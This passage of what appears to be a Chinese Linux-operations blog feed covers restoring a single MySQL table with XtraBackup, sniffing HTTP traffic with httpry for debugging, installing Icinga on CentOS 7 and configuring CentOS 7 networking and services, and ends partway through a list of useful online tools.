<h5 id="导出表"><a href="#导出表" class="headerlink" title="导出表"></a>导出表</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">[root@simlinux ~]#tar -ixf searchaccount.tar.gz -C /data/databak/</div><div class="line">[root@simlinux ~]#innobackupex --apply-log --export /data/databak</div><div class="line"></div><div class="line">[root@simlinux ~]#ll /data/databak/se</div><div class="line">-rw-r--r-- 1   root  root     3382    9月  13 13:57 searchaccount.cfg</div><div class="line">-rw-r--r-- 1   root  root    16384   9月  13 13:57 searchaccount.exp</div><div class="line">-rw-rw---- 1  root  root   23968    9月  13 13:40 searchaccount.frm</div><div class="line">-rw-rw---- 1  root  root  2097152 9月   13 13:40 searchaccount.ibd</div></pre></td></tr></table></figure>
<h5 id="还原表"><a href="#还原表" class="headerlink" title="还原表"></a>还原表</h5><p>定义表–删除表空间–拷贝<em>.ibd/</em>.cfg文件–导入表空间<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div></pre></td><td class="code"><pre><div class="line">CREATE TABLE `searchaccount` (</div><div class="line">  `id` mediumint(8) unsigned NOT NULL AUTO_INCREMENT,</div><div class="line">  `cid` mediumint(7) unsigned NOT NULL DEFAULT &apos;0&apos;,</div><div class="line">  `siteid` int(10) unsigned NOT NULL DEFAULT &apos;0&apos; COMMENT &apos;账号对应广告监测站点(online.site.id)&apos;,</div><div class="line">  `searchen` tinyint(2) unsigned NOT NULL DEFAULT &apos;0&apos; COMMENT &apos;1: 百度 2: 谷歌 3:搜狗 4:搜搜&apos;,</div><div class="line">  `oid` bigint(10) unsigned NOT NULL DEFAULT &apos;0&apos; COMMENT &apos;对接账号ID（如SOGOU后台取得唯一ID）&apos;,</div><div class="line">  `name` varchar(30) NOT NULL DEFAULT &apos;&apos; COMMENT &apos;账号名称&apos;,</div><div class="line">  `acountname` varchar(100) NOT NULL DEFAULT &apos;&apos; COMMENT &apos;搜索账号用户名/邮箱&apos;,</div><div class="line">  `certifiedname` varchar(50) NOT NULL DEFAULT &apos;&apos; COMMENT &apos;百度V认证名称&apos;,</div><div class="line">  `acountpass` varchar(100) NOT NULL DEFAULT &apos;&apos; COMMENT &apos;搜索账号密码&apos;,</div><div class="line">  `accesstoken` varchar(100) NOT NULL DEFAULT &apos;&apos; COMMENT &apos;360权限代码&apos;,</div><div class="line">  `budgettype` tinyint(1) NOT NULL DEFAULT &apos;1&apos; COMMENT &apos;预算类型 1：日预算 2：周预算 0：不限制预算&apos;,</div><div class="line">  `budget` decimal(12,2) NOT NULL DEFAULT &apos;0.00&apos; COMMENT &apos;帐号预算，google帐号需要用到&apos;,</div><div class="line">  `weeklybudget` varchar(1024) NOT NULL DEFAULT &apos;&apos; COMMENT &apos;周预算存储的值&apos;,</div><div class="line">  `erate` decimal(5,3) NOT NULL DEFAULT &apos;0.000&apos; COMMENT &apos;汇率&apos;,</div><div class="line">  `ispublic` tinyint(1) NOT NULL DEFAULT &apos;1&apos; COMMENT &apos;是否通过审核，0为未通过，1为通过&apos;,</div><div class="line">  `servicerate` decimal(5,2) NOT NULL DEFAULT &apos;0.00&apos; COMMENT &apos;服务费比率&apos;,</div><div class="line">  `krnum` mediumint(6) unsigned NOT NULL DEFAULT &apos;0&apos; COMMENT &apos;百度关键字推荐API配额&apos;,</div><div class="line">  `agent` tinyint(2) NOT NULL DEFAULT &apos;0&apos; COMMENT &apos;代理公司 1：广州 2：深圳&apos;,</div><div class="line">  `authtoken` varchar(500) NOT NULL DEFAULT &apos;&apos; COMMENT &apos;google API authoken值&apos;,</div><div class="line">  `tokenovertime` int(10) unsigned NOT NULL DEFAULT &apos;0&apos; COMMENT &apos;authtoken的过期时间&apos;,</div><div class="line">  `opendomains` varchar(220) NOT NULL DEFAULT &apos;&apos; COMMENT &apos;网站开放域名,多个域名用,分隔&apos;,</div><div class="line">  `excludeip` varchar(512) NOT NULL DEFAULT &apos;&apos; COMMENT &apos;排除IP，以,分隔&apos;,</div><div class="line">  `regions` varchar(2048) NOT NULL DEFAULT &apos;&apos; COMMENT &apos;投放地区&apos;,</div><div class="line">  `regionlevel` tinyint(1) NOT NULL DEFAULT &apos;2&apos; COMMENT &apos;投放地域开通的级别 1级 2级&apos;,</div><div class="line">  `campaigns` smallint(4) unsigned NOT NULL DEFAULT &apos;0&apos;,</div><div class="line">  `groups` smallint(5) unsigned NOT NULL DEFAULT &apos;0&apos;,</div><div class="line">  `creatives` mediumint(6) unsigned NOT NULL DEFAULT &apos;0&apos;,</div><div class="line">  `keywords` mediumint(7) unsigned NOT NULL DEFAULT &apos;0&apos;,</div><div class="line">  `dailyfee` decimal(10,2) NOT NULL DEFAULT &apos;0.00&apos; COMMENT &apos;平均每天消耗&apos;,</div><div class="line">  `costbefore` decimal(10,2) NOT NULL DEFAULT &apos;0.00&apos; COMMENT &apos;账号暂停前的消耗，用于统计帐号暂停前的消耗&apos;,</div><div class="line">  `costpause` decimal(10,2) NOT NULL DEFAULT &apos;0.00&apos; COMMENT &apos;重新签约时，将之前暂停统计到的消费(costbefore)累加到此字段&apos;,</div><div class="line">  `balance` decimal(10,2) NOT NULL DEFAULT &apos;0.00&apos; COMMENT &apos;总账户余额&apos;,</div><div class="line">  `adwordsbalance` decimal(10,2) NOT NULL DEFAULT &apos;0.00&apos; COMMENT &apos;搜索广告余额&apos;,</div><div class="line">  `networkbalance` decimal(10,2) NOT NULL DEFAULT &apos;0.00&apos; COMMENT &apos;网盟余额&apos;,</div><div class="line">  `reapi` tinyint(1) NOT NULL DEFAULT &apos;0&apos; COMMENT &apos;是否需要重新全部同步api, 1全部同步，0不全部&apos;,</div><div class="line">  `errorcode` char(32) NOT NULL DEFAULT &apos;0&apos; COMMENT &apos;百度的错误代码为数字类型;谷歌的为大写字符串&apos;,</div><div class="line">  `syntime` int(10) unsigned NOT NULL DEFAULT &apos;0&apos; COMMENT &apos;同步时间&apos;,</div><div class="line">  `statusrank` tinyint(1) NOT NULL DEFAULT &apos;0&apos; COMMENT &apos;暂停竞价设置 0自动暂停 1保持运行状态&apos;,</div><div class="line">  `status` tinyint(1) unsigned NOT NULL DEFAULT &apos;1&apos; COMMENT &apos;运行状态,1:正常 2:暂停 3:异常 9: 删除&apos;,</div><div class="line">  `createtime` int(10) unsigned NOT NULL DEFAULT &apos;0&apos; COMMENT &apos;创建时间&apos;,</div><div class="line">  `ocreatetime` int(10) NOT NULL DEFAULT &apos;0&apos; COMMENT &apos;暂停时记录客户第一次添加时间&apos;,</div><div class="line">  `stopReason` varchar(20) DEFAULT NULL,</div><div class="line">  `updateTime` int(11) DEFAULT NULL,</div><div class="line">  PRIMARY KEY (`id`),</div><div class="line">  UNIQUE KEY `acountname` (`acountname`,`searchen`),</div><div class="line">  KEY `cid` (`cid`)</div><div class="line">) ENGINE=InnoDB AUTO_INCREMENT=10389 DEFAULT CHARSET=utf8 COMMENT=&apos;搜索营销账号表&apos;；</div><div class="line"></div><div class="line">mysql &gt; ALTER TABLE se.searchaccount DISCARD TABLESPACE;</div><div class="line"></div><div class="line">[root@simlinux ~]#cp /data/databak/se/&#123;searchaccount.ibd,searchaccount.cfg&#125; /usr/local/mysql/data/se/ </div><div class="line"></div><div class="line">[root@simlinux ~]#chown mysql.mysql /usr/local/mysql/data/se/ </div><div class="line"></div><div class="line">mysql &gt; ALTER TABLE se.searchaccount IMPORT TABLESPACE;</div></pre></td></tr></table></figure></p>
<p><strong> 注：</strong>.cfg文件包含InnoDB字典的特殊存储格式；如果目的库是XtraDB，需要拷贝searchaccount.ibd、searchaccount.exp</p>
<h4 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h4><blockquote>
<p><a href="http://www.percona.com/doc/percona-xtrabackup/2.2/innobackupex/restoring_individual_tables_ibk.html" target="_blank" rel="external">http://www.percona.com/doc/percona-xtrabackup/2.2/innobackupex/restoring_individual_tables_ibk.html</a><br><a href="http://xxrenzhe.blog.51cto.com/4036116/1401454" target="_blank" rel="external">http://xxrenzhe.blog.51cto.com/4036116/1401454</a><br><a href="http://wangfeng7399.blog.51cto.com/3518031/1394996" target="_blank" rel="external">http://wangfeng7399.blog.51cto.com/3518031/1394996</a></p>
</blockquote>
]]></content>
      
        <categories>
            
            <category> MySQL数据库 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> XtraBackup </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[如何在Linux下使用命令行嗅探HTTP流量]]></title>
      <url>/2014/08/22/linux-httpry.html</url>
      <content type="html"><![CDATA[<p>通常我们在调试Web应用、RESTFUL服务或者排错PAC (proxy auto config) 以及检查是否有恶意访问等会去通过错误日志日志或者嗅探数据包的方式去排错；常见的嗅探数据包软件有tcpdump、wireshark;但是针对HTTP需要对数据包进行过滤，显示格式也更不容易读，Httpry工具就能更方便易读的嗅探HTTP流量</p>
<h4 id="安装httpry"><a href="#安装httpry" class="headerlink" title="安装httpry"></a>安装httpry</h4><p>基于Debian(Ubuntu or Linux Mint)，基础库并没有httpry包，我们用源码来安装<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">$ sudo apt-get install gcc make git libpcap0.8-dev</div><div class="line">$ git clone https://github.com/jbittel/httpry.git</div><div class="line">$ cd httpry</div><div class="line">$ make</div><div class="line">$ sudo make install</div></pre></td></tr></table></figure></p>
<p>基于Fedora，CentOS or RHEL可以使用EPEL来yum安装<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ sudo yum install httpry</div></pre></td></tr></table></figure></p>
<p>也可以通过源码安装<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">$ sudo yum install gcc make git libpcap-devel</div><div class="line">$ git clone https://github.com/jbittel/httpry.git</div><div class="line">$ cd httpry</div><div class="line">$ make</div><div class="line">$ sudo make install</div></pre></td></tr></table></figure></p>
<h4 id="httpry的基本使用"><a href="#httpry的基本使用" class="headerlink" title="httpry的基本使用"></a>httpry的基本使用</h4><p>httpry通过监听网卡接口来实时嗅探HTTP的请求和响应<br>$ sudo httpry -i <network-interface><br><a href="http://ow1schdt5.bkt.clouddn.com/2014/08/ryeth0.png" target="_blank" rel="external"><img src="http://ow1schdt5.bkt.clouddn.com/2014/08/ryeth0-1024x469.png" alt="ryeth0"></a><br>将HTTP 数据包保存为二进制文件<br>$ sudo httpry -i eth0 -b output.dump</network-interface></p>
<p>重放HTTP数据包</p>
<p><pre class="lang:php decode:true ">$ sudo httpry -r output.dump<br>将HTTP 数据包保存为文本文件<br>$ sudo httpry -i eth0 -o output.txt</pre></p>
<h4 id="httpry的高级应用"><a href="#httpry的高级应用" class="headerlink" title="httpry的高级应用"></a>httpry的高级应用</h4><p>监控特定的HTTP请求方式(GET,POST,PUT,HEAD,CONNECT等),使用-m参数</p>
<p><a href="http://ow1schdt5.bkt.clouddn.com/2014/08/get.png" target="_blank" rel="external"><img src="http://ow1schdt5.bkt.clouddn.com/2014/08/get-1024x333.png" alt="get"></a><br>如果你httpry下载的源代码,你会发现有一组Perl脚本的源代码,帮助分析httpry的输出<br>这些脚本httpry /scripts/plugins目录中找到。如果你想编写一个自定义解析器httpry的输出,这些脚本是很好的例子.他们的一些功能:</p>
<ul>
<li>hostnames: 显示主机名列表.</li>
<li>find_proxies: 测web代理</li>
<li>search_terms: 找在搜索服务里面的搜索词.</li>
<li>content_analysis: 发现uri包含特定的关键词</li>
<li>xml_output: 转换为XML格式输出</li>
<li>log_summary: 生成日志汇总</li>
<li>db_dump: 日志文件数据转储到一个数据库中<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ cd httpry/scripts</div><div class="line">$ perl parse_log.pl -d ./plugins &lt;httpry-output-file&gt;</div></pre></td></tr></table></figure>
</li>
</ul>
<p>执行之后httpry/scripts目录下生成txt/xml文件，例如log_summary.txt</p>
<p><a href="http://ow1schdt5.bkt.clouddn.com/2014/08/summary.jpg" target="_blank" rel="external"><img src="http://ow1schdt5.bkt.clouddn.com/2014/08/summary.jpg" alt="summary"></a></p>
<h4 id="相关工具"><a href="#相关工具" class="headerlink" title="相关工具"></a>相关工具</h4><p><code>ngxtop</code></p>
<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><blockquote>
<p><a href="http://xmodulo.com/2014/06/monitor-nginx-web-server-command-line-real-time.html" target="_blank" rel="external">http://xmodulo.com/2014/06/monitor-nginx-web-server-command-line-real-time.html</a><br><a href="http://www.ttlsa.com/nginx/nginx-modules-ngxtop-ttlsa/" target="_blank" rel="external">http://dumpsterventures.com/jason/httpry/</a><br><a href="http://www.ttlsa.com/nginx/nginx-modules-ngxtop-ttlsa/" target="_blank" rel="external">http://www.ttlsa.com/nginx/nginx-modules-ngxtop-ttlsa/</a></p>
</blockquote>
]]></content>
      
        <categories>
            
            <category> Linux运维 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> httpry </tag>
            
            <tag> ngxtop </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[开源Linux监控系统:Icinga]]></title>
      <url>/2014/08/20/icina-linux.html</url>
      <content type="html"><![CDATA[<p>“<br>其实Icinga是Nagios监控的一个分支，有两个分支版本Icinga1和Icinga2；Icinga除了完全兼容Nagios的插件和扩展甚至配置文件，在web接口和报告上有很大的改进，并且简化了插件的开发；Icinga1和Nagios的基础监控类似，增加了一些新的特性和修复了Nagios的一些bug<br>“<br>详细可参考：<br><a href="https://www.icinga.org/icinga/icinga-1/features/" target="_blank" rel="external">https://www.icinga.org/icinga/icinga-1/features/</a><br><a href="https://www.icinga.org/icinga/icinga-2/architecture/" target="_blank" rel="external">https://www.icinga.org/icinga/icinga-2/architecture/</a><br>下面基于Centos7来安装Icinga1：</p>
<h4 id="安装LAMP环境"><a href="#安装LAMP环境" class="headerlink" title="安装LAMP环境"></a>安装LAMP环境</h4><h4 id="安装apache和php"><a href="#安装apache和php" class="headerlink" title="安装apache和php"></a>安装apache和php</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">yum -y install httpd php php-pear php-xmlrpc php-xsl php-soap php-mysql php-pdo php-gd php-mbstring</div><div class="line">防火墙放行httpd服务</div><div class="line">firewall-cmd —add-service=http (临时放行)</div><div class="line">firewall-cmd —permanent —add-service=http（永久放行，写入配置文件，系统重启后依然有效）</div><div class="line">systemctl start http.service</div><div class="line"></div><div class="line">    vim /var/www/html/info.php</div><div class="line">    &lt;?php</div><div class="line">        phpinfo();</div><div class="line">    ?&gt;</div><div class="line">    &lt;br&gt;</div><div class="line">    测试php解析是否正常</div><div class="line">    vim /etc/php.ini</div><div class="line">    date.timezone= PRC</div></pre></td></tr></table></figure>
<h4 id="安装Mariadb"><a href="#安装Mariadb" class="headerlink" title="安装Mariadb"></a>安装Mariadb</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">yum -y install mariadb-server mariadb</div><div class="line">    mysql_secure_installation</div><div class="line">    systemctl start mariadb</div><div class="line">    systemctl status mariadb</div></pre></td></tr></table></figure>
<h4 id="安装icinga监控工具"><a href="#安装icinga监控工具" class="headerlink" title="安装icinga监控工具"></a>安装icinga监控工具</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">wget http://packages.icinga.org/epel/ICINGA-release.repo -O /etc/yum.repod/icinga.repo</div><div class="line">rpm --import http://packages.icinga.org/icinga.key</div><div class="line">yum  -y install icinga icinga-doc icinga-gui</div><div class="line">htpasswd -cm /etc/icinga/passwd  geekwolf</div><div class="line">systemctl start icinga</div><div class="line">systemctl start httpd</div></pre></td></tr></table></figure>
<h4 id="安装Nagios插件"><a href="#安装Nagios插件" class="headerlink" title="安装Nagios插件"></a>安装Nagios插件</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">rpm -Uvh http://ftp.ines.lug.ro/fedora/epel/beta/7/x86_64/epel-release-7-0.2.noarch.rpm</div><div class="line">yum -y install nagios-plugins nagios-plugins-all</div><div class="line">配置文件路径/etc/icinga，配置方式和nagios一样</div><div class="line"></div><div class="line">vim  /etc/icinga/cgi.cfg</div><div class="line">authorized_for_system_information=geekwolf</div><div class="line">authorized_for_configuration_information=geekwolf</div><div class="line">authorized_for_full_command_resolution=geekwolf</div><div class="line">authorized_for_system_commands=geekwolf</div><div class="line">authorized_for_all_services=geekwolf</div><div class="line">authorized_for_all_hosts=geekwolf</div><div class="line">authorized_for_all_service_commands=geekwolf</div><div class="line">authorized_for_all_host_commands=geekwolf</div></pre></td></tr></table></figure>
<p>访问Web:<a href="http://192.168.117.129/icinga" target="_blank" rel="external">http://192.168.117.129/icinga</a></p>
<p><a href="http://ow1schdt5.bkt.clouddn.com/2014/08/icingam.png" target="_blank" rel="external"><img src="http://ow1schdt5.bkt.clouddn.com/2014/08/icingam.png" alt="icingam"></a></p>
<h4 id="相关资源"><a href="#相关资源" class="headerlink" title="相关资源"></a>相关资源</h4><blockquote>
<p>Icinga官方文档 :<a href="http://docs.icinga.org/" target="_blank" rel="external">http://docs.icinga.org</a><br>Icinga EPEL :<a href="http://packages.icinga.org/epel" target="_blank" rel="external">http://packages.icinga.org/epel</a><br>Icinga安装包及vagrant box下载 ：<a href="https://www.icinga.org/download" target="_blank" rel="external">https://www.icinga.org/download</a><br>Centos7网络配置和服务管理参考: <a href="http://simlinux.com/blog/2014/08/12/centos7wang-luo-pei-zhi-he-fu-wu-guan-li/" target="_blank" rel="external">http://simlinux.com/blog/2014/08/12/centos7wang-luo-pei-zhi-he-fu-wu-guan-li/</a></p>
</blockquote>
]]></content>
      
        <categories>
            
            <category> Linux运维 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> icinga </tag>
            
            <tag> nagios </tag>
            
            <tag> 监控 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[CentOS7网络配置和服务管理]]></title>
      <url>/2014/08/20/centos7-network-config.html</url>
      <content type="html"><![CDATA[<h4 id="配置网络"><a href="#配置网络" class="headerlink" title="配置网络"></a>配置网络</h4><p>在使用Vmware Workstation10.2测试过程中，发现可能部分物理机100M网卡不能正常识别，换到了1000M网卡上测试能正常识别虚拟网卡<br>Centos7系统的网卡设备命名有所变化，可参考<a href="http://www.pubyun.com/blog/deveops/centos-7%E4%B8%8B%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E5%91%BD%E5%90%8D/" target="_blank" rel="external">CentOS 7下网络设备命名</a>，个人感觉既然学习新系统，完全没必要换成传统的识别名方式，要勇于接受新知识~</p>
<ol>
<li><p>通过编辑文件修改网络配置</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line">vim   /etc/sysconfig/network-scripts/ifcfg-eno16777736</div><div class="line">HWADDR=00:0c:29:14:34:51</div><div class="line">TYPE=Ethernet</div><div class="line">BOOTPROTO=static</div><div class="line">DEFROUTE=yes</div><div class="line">PEERDNS=yes</div><div class="line">PEERROUTES=yes</div><div class="line">USERCTL=no</div><div class="line">NM_CONTROLLED=no</div><div class="line">IPV4_FAILURE_FATAL=no</div><div class="line">IPV6INIT=yes</div><div class="line">IPV6_AUTOCONF=yes</div><div class="line">IPV6_DEFROUTE=yes</div><div class="line">IPV6_PEERDNS=yes</div><div class="line">IPV6_PEERROUTES=yes</div><div class="line">IPV6_FAILURE_FATAL=no</div><div class="line">NAME=eno16777736</div><div class="line">ONBOOT=yes</div><div class="line">IPADDR=192.168.117.128</div><div class="line">NETMASK=255.255.255.0</div><div class="line">GATEWAY=192.168.117.2</div><div class="line">DNS1=192.168.117.2</div><div class="line">关键配置：</div><div class="line"></div><div class="line">TYPE=Ethernet</div><div class="line">BOOTPROTO=static</div><div class="line">NAME=eno16777736</div><div class="line">ONBOOT=yes</div><div class="line">IPADDR=192.168.117.128</div><div class="line">NETMASK=255.255.255.0</div><div class="line">GATEWAY=192.168.117.2</div><div class="line">DNS1=192.168.117.2</div><div class="line"></div><div class="line">cat /etc/resolv.conf</div><div class="line">nameserver 192.168.117.2</div></pre></td></tr></table></figure>
</li>
<li><p>通过文本工具nmtui修改网络配置(RHEL7/CentOS7默认安装,前提需要开启NetworkManager.service才可以使用)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">yum -y install NetworkManager-tui</div><div class="line">    nmtui-edit eno16777736  修改网卡配置</div><div class="line">    nmtui-connect eno16777736</div><div class="line">重启网络</div><div class="line">systemctl  restart network</div><div class="line">systemctl  status network</div><div class="line">修改主机名：</div><div class="line">vim /etc/hostname</div><div class="line">centos7.simlinux.com</div><div class="line">退出重新登录即可生效</div></pre></td></tr></table></figure>
</li>
</ol>
<h4 id="关闭不必要的服务"><a href="#关闭不必要的服务" class="headerlink" title="关闭不必要的服务"></a>关闭不必要的服务</h4><p>最小化安装的Centos7系统并没有nano、vim、wget、curl、ifconfig、lsof命令，这里首先安装一下：<br><code>yum -y install nano vim wget curl net-tools lsof</code><br>可以通过netstat和lsof查看系统都运行了哪些服务，将不必要的进行关闭<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">systemctl stop postfix</div><div class="line">systemctl stop avahi-daemon</div><div class="line">systemctl disable postfix</div><div class="line">systemctl disable avahi-daemon</div><div class="line">systemctl list-unit-files    查看正在运行服务的状态报告</div><div class="line">systemctl start httpd.service    启动服务</div><div class="line">systemctl stop  httpd.service    关闭服务</div><div class="line">systemctl restart  httpd.service 重启服务</div><div class="line">systemctl reload   httpd.service 重新加载服务</div><div class="line">systemctl disable  httpd.service 开机不启动</div><div class="line">systemctl enable   httpd.service 开机启动</div><div class="line">systemctl status   httpd.service 查看服务运行状态</div><div class="line">systemctl show     httpd.service 显示服务或任务的属性</div><div class="line">systemctl list-dependencies  httpd.service  检查服务依赖关系</div><div class="line">systemctl is-enabled  httpd.service  检查服务是否开机启动及级别</div><div class="line">systemctl -H 192.168.117.128 start httpd.service   启动192.168.117.128机器上的httpd服务</div></pre></td></tr></table></figure></p>
]]></content>
      
        <categories>
            
            <category> Linux运维 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Centos7 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[16个很有用的在线工具]]></title>
      <url>/2014/08/20/16-online-tools.html</url>
      <content type="html"><![CDATA[<p><strong>1. <a href="http://explainshell.com/" target="_blank" rel="external">ExplainShell.com</a> 命令解释</strong></p>
<p><a href="http://ow1schdt5.bkt.clouddn.com/2014/08/explainshell.jpg" target="_blank" rel="external"><img src="http://ow1schdt5.bkt.clouddn.com/2014/08/explainshell.jpg" alt="explainshell"></a></p>
<p>  对于Linux用户来说每天都会写各种命令和脚本，那么你可以使用这个网站工具来查看命令式如何工作的,这样可以避免不必要的错误出现；也是一个很好的学习命令的方式</p>
<p><strong>2. <a href="http://simlinux.com/BashrcGenerator.com/" target="_blank" rel="external">BashrcGenerator.com</a> 定制个性命令提示符</strong></p>
<p><a href="http://ow1schdt5.bkt.clouddn.com/2014/08/generator.jpg" target="_blank" rel="external"><img src="http://ow1schdt5.bkt.clouddn.com/2014/08/generator.jpg" alt="generator"></a></p>
<p>  简单说就是个性化生成命令提示符，可将生成的代码写入到用户家目录的.bashrc或者可以设置全局变量文件/etc/profile对所有用户生效<br>可参考：<a href="http://stackoverflow.com/questions/4133904/ps1-line-with-git-current-branch-and-colors" target="_blank" rel="external">http://stackoverflow.com/questions/4133904/ps1-line-with-git-current-branch-and-colors</a></p>
<p><strong>3. <a href="http://vim-adventures.com/" target="_blank" rel="external">Vim-adventures.com</a> 通过RPG游戏练习VIM使用</strong></p>
<p><a href="http://ow1schdt5.bkt.clouddn.com/2014/08/vim.jpg" target="_blank" rel="external"><img src="http://ow1schdt5.bkt.clouddn.com/2014/08/vim.jpg" alt="vim"></a></p>
<p>  通过RPG游戏练习VIM编辑器的使用，使用h,j,k,l字符移动人物来获得新的命令能力和搜集钥匙，查看帮助可使用:help;赶脚这个非常cool!</p>
<p><strong>4. <a href="https://try.github.io/levels/1/challenges/2" target="_blank" rel="external">Try Github</a> 在线学习Git版本控制</strong></p>
<p><a href="http://ow1schdt5.bkt.clouddn.com/2014/08/trygit.jpg" target="_blank" rel="external"><img src="http://ow1schdt5.bkt.clouddn.com/2014/08/trygit.jpg" alt="trygit"></a></p>
<p>  十五分钟学会Git，很明显这个网站模拟了一个控制台，以很时尚的界面让人对Git不再望而生畏</p>
<p><strong>5. <a href="http://shortcutfoo.com/" target="_blank" rel="external">Shortcutfoo.com</a></strong></p>
<p><a href="http://ow1schdt5.bkt.clouddn.com/2014/08/shortcutfoo.jpg" target="_blank" rel="external"><img src="http://ow1schdt5.bkt.clouddn.com/2014/08/shortcutfoo.jpg" alt="shortcutfoo"></a></p>
<p>  是一个练习快捷键的好地方，涵盖了vim、sublime、emacs、git等软件的快捷使用方式和友好的说明</p>
<p><strong>6. <a href="https://github.com/geekwolf/free-programming-books" target="_blank" rel="external">GitHub Free Programming Books</a> 免费编程书籍</strong></p>
<p><a href="http://ow1schdt5.bkt.clouddn.com/2014/08/freebooks.jpg" target="_blank" rel="external"><img src="http://ow1schdt5.bkt.clouddn.com/2014/08/freebooks.jpg" alt="freebooks"></a></p>
<p>  以Github管理的方式搜集了免费的编程和系统管理等书籍，给作者点1024个赞~~，另外连接是fork原作者，后续增加中文书籍</p>
<p><strong>7. <a href="http://collabedit.com/" target="_blank" rel="external">Collabedit.com</a> 实时文本交互聊天</strong></p>
<p><a href="http://ow1schdt5.bkt.clouddn.com/2014/08/coolabedit.jpg" target="_blank" rel="external"><img src="http://ow1schdt5.bkt.clouddn.com/2014/08/coolabedit.jpg" alt="coolabedit"></a></p>
<p>   先说下使用，你可以创建一个文档<code>http://collabedit.com/yb22u</code>填写相关的用户名和选择语言；然后可以将此文档地址发给另一个人，那么互相之间就可以实时看到对方的输入，有高亮语法；使用场合嘛，比如通过collabedit可以考量对方编程能力等</p>
<p><strong>8. <a href="http://cpp.sh/" target="_blank" rel="external">Cpp.sh</a> 在线编写运行分享C++代码编辑器</strong></p>
<p><a href="http://ow1schdt5.bkt.clouddn.com/2014/08/cpp.jpg" target="_blank" rel="external"><img src="http://ow1schdt5.bkt.clouddn.com/2014/08/cpp.jpg" alt="cpp"></a></p>
<p>  可在线编辑运行C++代码，亦可Ctrl+Z生成url分享给好友</p>
